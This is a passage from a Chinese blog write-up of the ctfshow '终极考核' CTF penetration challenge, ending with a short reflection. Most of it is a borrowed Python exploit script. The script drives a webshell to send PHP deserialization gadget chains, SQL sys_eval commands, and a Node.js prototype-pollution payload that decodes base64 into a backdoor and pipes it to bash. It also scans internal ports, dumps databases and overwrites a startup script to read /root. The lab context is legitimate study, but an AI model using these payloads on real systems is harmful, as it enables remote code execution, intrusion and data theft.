class="comment"># print(phpsessid)</span></span><br><span class="line">        flag656=<span class="built_in">str</span>(base64.b64decode(auth))</span><br><span class="line">        <span class="comment">#web656</span></span><br><span class="line">        <span class="built_in">print</span>(re.findall(<span class="string">&#x27;flag.*?=ctfshow&#123;.*?&#125;&#x27;</span>,flag656)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">60</span>)    <span class="comment"># 应该是一分钟一次</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#web667, 时间太久了，直接定位到3000端口，想跑一下也行</span></span><br><span class="line"><span class="comment"># for i in range(1,10000):</span></span><br><span class="line"><span class="comment">#     cmd=&#x27;echo file_get_contents(\&#x27;http://&#x27; + ip2 + &#x27;:&#x27; + str(i) + &#x27;\&#x27;);&#x27;</span></span><br><span class="line"><span class="comment">#     data5 = &#123;&#x27;1&#x27;: cmd&#125;</span></span><br><span class="line"><span class="comment">#     r = sess.post(url + &quot;a.php&quot;, data=data5)</span></span><br><span class="line"><span class="comment">#     print(i)</span></span><br><span class="line"><span class="comment">#     if &#x27;Connection refused&#x27; not in r.text:</span></span><br><span class="line"><span class="comment">#         print(cmd + &#x27;\n&#x27; + r.text)</span></span><br><span class="line">cmd=<span class="string">&#x27;echo file_get_contents(\&#x27;http://&#x27;</span> + ip2 + <span class="string">&#x27;:3000&#x27;</span> + <span class="string">&#x27;\&#x27;);&#x27;</span></span><br><span class="line">data5 = &#123;<span class="string">&#x27;1&#x27;</span>: cmd&#125;</span><br><span class="line">r = sess.post(url + <span class="string">&quot;a.php&quot;</span>, data=data5)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#web658</span></span><br><span class="line">ser=<span class="string">&quot;O%3A32%3A%22Codeception%5CExtension%5CRunProcess%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00output%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A5%3A%22jiang%22%3B%7Ds%3A43%3A%22%00Codeception%5CExtension%5CRunProcess%00processes%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A28%3A%22GuzzleHttp%5CPsr7%5CAppendStream%22%3A2%3A%7Bs%3A37%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00streams%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A29%3A%22GuzzleHttp%5CPsr7%5CCachingStream%22%3A2%3A%7Bs%3A43%3A%22%00GuzzleHttp%5CPsr7%5CCachingStream%00remoteStream%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bb%3A0%3B%7Ds%3A6%3A%22stream%22%3BO%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3A3%3A%7Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00source%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A231%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A76%3A%22function%28%29%7B%5Cphpinfo%28%29%3B%5Chighlight_file%28%27%2Fvar%2Fwww%2Fhtml%2Fflag.php%27%29%3B%5Cphpinfo%28%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000004e63ed86000000002cc68e15%22%3B%7D%7Ds%3A32%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00size%22%3Bi%3A-10%3Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00buffer%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A1%3A%22j%22%3B%7D%7D%7D%7Ds%3A38%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00seekable%22%3Bb%3A1%3B%7D%7D%7D%7D&quot;</span></span><br><span class="line">data6=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;echo ` curl  -H &quot;Content-Type: application/x-www-form-urlencoded&quot;   -X POST  -d &quot;UnserializeForm[ctfshowUnserializeData]=&#123;0&#125;&quot; http://&#123;1&#125;:8888?r=site/unserialize\\&amp;key=flag_663%3Dctfshow%7Bfa5cc1fb0bfc986d1ef150269c0de197%7D`;&#x27;</span>.<span class="built_in">format</span>(ser,ip2)&#125;</span><br><span class="line">flags=re.findall(<span class="string">&#x27;flag.*?=ctfshow&#123;.*?&#125;&#x27;</span>,sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=data6).text)</span><br><span class="line"><span class="built_in">print</span>(flags[<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#web662</span></span><br><span class="line"><span class="built_in">list</span>=<span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">m=<span class="string">&#x27;&#x27;</span></span><br><span class="line">result=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                payload=<span class="string">&quot;sudo curl &quot;</span>+ip2+<span class="string">&quot;/&quot;</span>+<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)+<span class="built_in">str</span>(k)+<span class="string">&quot;.html&quot;</span></span><br><span class="line">                payload=<span class="string">&quot;select sys_eval(&#x27;&quot;</span>+payload+<span class="string">&quot;&#x27;);&quot;</span></span><br><span class="line">                <span class="comment"># print(str(i)+str(j)+str(k)+&quot;.html&quot;)</span></span><br><span class="line">                data = &#123;<span class="string">&quot;sql&quot;</span>: payload,&#125;</span><br><span class="line">                r = requests.post(url=url+<span class="string">&#x27;sqltest.php&#x27;</span>, data=data)</span><br><span class="line">                m=r.text</span><br><span class="line">                <span class="keyword">if</span>(<span class="string">&#x27;404&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> m):</span><br><span class="line">                    <span class="built_in">print</span>(r.text)</span><br><span class="line">                    result=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(result==<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(result==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##web664</span></span><br><span class="line">ser=<span class="string">&quot;O%3A32%3A%22Codeception%5CExtension%5CRunProcess%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00output%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A5%3A%22jiang%22%3B%7Ds%3A43%3A%22%00Codeception%5CExtension%5CRunProcess%00processes%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A28%3A%22GuzzleHttp%5CPsr7%5CAppendStream%22%3A2%3A%7Bs%3A37%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00streams%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A29%3A%22GuzzleHttp%5CPsr7%5CCachingStream%22%3A2%3A%7Bs%3A43%3A%22%00GuzzleHttp%5CPsr7%5CCachingStream%00remoteStream%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bb%3A0%3B%7Ds%3A6%3A%22stream%22%3BO%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3A3%3A%7Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00source%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A228%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A73%3A%22function%28%29%7B%5Cphpinfo%28%29%3B%5Chighlight_file%28%27%2Fvar%2Foa%2Fflag664.php%27%29%3B%5Cphpinfo%28%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000000b45001f0000000040612da3%22%3B%7D%7Ds%3A32%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00size%22%3Bi%3A-10%3Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00buffer%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A1%3A%22j%22%3B%7D%7D%7D%7Ds%3A38%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00seekable%22%3Bb%3A1%3B%7D%7D%7D%7D&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;echo ` curl  -H &quot;Content-Type: application/x-www-form-urlencoded&quot;   -X POST  -d &quot;UnserializeForm[ctfshowUnserializeData]=&#123;0&#125;&quot; http://&#123;1&#125;:8888?r=site/unserialize\\&amp;key=flag_663%3Dctfshow%7Bfa5cc1fb0bfc986d1ef150269c0de197%7D`;&#x27;</span>.<span class="built_in">format</span>(ser,ip2)&#125;</span><br><span class="line">flags=re.findall(<span class="string">&#x27;flag_.*?=ctfshow&#123;.*?&#125;&#x27;</span>,sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=data).text)</span><br><span class="line"><span class="built_in">print</span>(flags[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#用nodejs来rce</span></span><br><span class="line">cmd=<span class="string">&#x27;&#x27;&#x27;echo `curl -i -X POST -H &#x27;Content-type&#x27;:&#x27;application/json&#x27; -d &quot;&#123;\\&quot;__proto__\\&quot;:&#123;\\&quot;__proto__\\&quot;: &#123;\\&quot;type\\&quot;:\\&quot;Block\\&quot;,\\&quot;nodes\\&quot;:\\&quot;\\&quot;,\\&quot;compileDebug\\&quot;:1,\\&quot;self\\&quot;:1,\\&quot;line\\&quot;:\\&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo YmFzaCAtYyAiZWNobyBkbUZ5SUdoMGRIQWdQU0J5WlhGMWFYSmxLQ2RvZEhSd0p5azdDblpoY2lCeGRXVnllWE4wY21sdVp5QTlJSEpsY1hWcGNtVW9KM0YxWlhKNWMzUnlhVzVuSnlrN0NncDJZWElnY0c5emRFaFVUVXdnUFNBbk1USXpKenNLSUFwb2RIUndMbU55WldGMFpWTmxjblpsY2lobWRXNWpkR2x2YmlBb2NtVnhMQ0J5WlhNcElIc0tJQ0IyWVhJZ1ltOWtlU0E5SUNJaU93b2dJSEpsY1M1dmJpZ25aR0YwWVNjc0lHWjFibU4wYVc5dUlDaGphSFZ1YXlrZ2V3b2dJQ0FnWW05a2VTQXJQU0JqYUhWdWF6c0tJQ0I5S1RzS0lDQnlaWEV1YjI0b0oyVnVaQ2NzSUdaMWJtTjBhVzl1SUNncElIc0tJQ0FnSUdKdlpIa2dQU0J4ZFdWeWVYTjBjbWx1Wnk1d1lYSnpaU2hpYjJSNUtUc0tJQ0FnSUhKbGN5NTNjbWwwWlVobFlXUW9NakF3TENCN0owTnZiblJsYm5RdFZIbHdaU2M2SUNkMFpYaDBMMmgwYld3N0lHTm9ZWEp6WlhROWRYUm1PQ2Q5S1RzS0lIUnllWHNLSUNBZ0lHbG1LR0p2WkhrdVkyMWtLU0I3Q2lBZ0lDQWdJQ0FnY21WekxuZHlhWFJsS0NKMWMyVnlibUZ0WmUrOG1pSWdLeUJpYjJSNUxtTnRaQ2s3Q2lBZ0lDQWdJQ0FnZG1GeUlISmxjM1ZzZEQwZ1oyeHZZbUZzTG5CeWIyTmxjM011YldGcGJrMXZaSFZzWlM1amIyNXpkSEoxWTNSdmNpNWZiRzloWkNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTlRlVzVqS0NkaVlYTm9JQzFqSUNJbksySnZaSGt1WTIxa0t5Y2lKeWt1ZEc5VGRISnBibWNvS1RzS0lDQWdJQ0FnSUNCeVpYTXVkM0pwZEdVb2NtVnpkV3gwS1RzS0lDQWdJSDBnWld4elpTQjdDaUFnSUNBZ0lDQWdjbVZ6TG5keWFYUmxLSEJ2YzNSSVZFMU1LVHNLSUNBZ0lIMTlDaUFnSUNCallYUmphSHNLSUNBZ0lDQWdJSEpsY3k1M2NtbDBaU2h3YjNOMFNGUk5UQ2s3SUFvZ0lDQWdmUW9nSUNBZ2NtVnpMbVZ1WkNncE93b2dJSDBwT3dwOUtTNXNhWE4wWlc0b09EQXpNeWs3Q2c9PXxiYXNlNjQgLWQgPiAvaG9tZS9ub2RlL2FhLmpzO25vZGUgL2hvbWUvbm9kZS9hYS5qcyI=|base64 -d|bash&#x27;)\\&quot;&#125;&#125;&#125;&quot; http://&#x27;&#x27;&#x27;</span>+ip2+<span class="string">&#x27;&#x27;&#x27;:3000/login`;&#x27;&#x27;&#x27;</span></span><br><span class="line">sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:cmd&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#web666</span></span><br><span class="line">        <span class="built_in">print</span>(re.findall(<span class="string">&#x27;flag_.*?=ctfshow&#123;.*?&#125;&#x27;</span>,sess.post(url+<span class="string">&#x27;a.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&quot;echo `curl -X POST -d \&quot;cmd=mysql -uroot -proot -e &#x27;use ctfshow;select * from ctfshow_secret&#x27;\&quot; http://&#123;0&#125;:8033`;&quot;</span>.<span class="built_in">format</span>(ip2)&#125;).text)[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#web668</span></span><br><span class="line">        <span class="built_in">print</span>(re.findall(<span class="string">&#x27;flag_.*?=ctfshow&#123;.*?&#125;&#x27;</span>,sess.post(url+<span class="string">&#x27;a.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&quot;echo `curl -X POST -d \&quot;cmd=tac secret.txt\&quot; http://&#123;0&#125;:8033`;&quot;</span>.<span class="built_in">format</span>(ip2)&#125;).text)[<span class="number">0</span>])</span><br><span class="line">        sess.post(url+<span class="string">&#x27;a.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&quot;echo `curl -X POST -d \&quot;cmd=rm -rf  nodestartup.sh;echo &#x27;cat /root/* &gt; /home/node/a.txt &#x27; &gt; nodestartup.sh\&quot; http://&#123;0&#125;:8033`;&quot;</span>.<span class="built_in">format</span>(ip2)&#125;)</span><br><span class="line">        <span class="comment">#web669</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = sess.post(url + <span class="string">&#x27;a.php&#x27;</span>,</span><br><span class="line">                          data=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="string">&quot;echo `curl -X POST -d \&quot;cmd=cat a.txt\&quot; http://&#123;0&#125;:8033`;&quot;</span>.<span class="built_in">format</span>(ip2)&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(r.text)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>这是一个师傅写的借用一下，自己就懒得写了</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>还是很有意思的，中途卡在了那个xss哪里，一不小心花了300分买提示，气死我了，很多都是看着师傅们的WP写的，找flag找的头晕晕的，很好的一次渗透过程吧，之前没有渗透过</p>
<p>自己要学的东西还是很多啊，感谢网上的师傅们的博客，学到了一些东西</p>
<p>起因是因为看pickle反序列化有点看的不爽了，于是就来打了打</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechat.png" alt="baozongwi reward">
        <span>reward</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>baozongwi
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://baozongwi.xyz/posts/f8e94762.html" title="ctfshow终极考核">https://baozongwi.xyz/posts/f8e94762.html</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/php/" rel="tag"># php</a>
              <a href="/tags/mysql/" rel="tag"># mysql</a>
              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/dbe5f1d3.html" rel="prev" title="byteCTF2024">
                  <i class="fa fa-angle-left"></i> byteCTF2024
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/6c4382bd.html" rel="next" title="深入浅出XSS">
                  深入浅出XSS <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">baozongwi</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">3.1m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">87:21</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
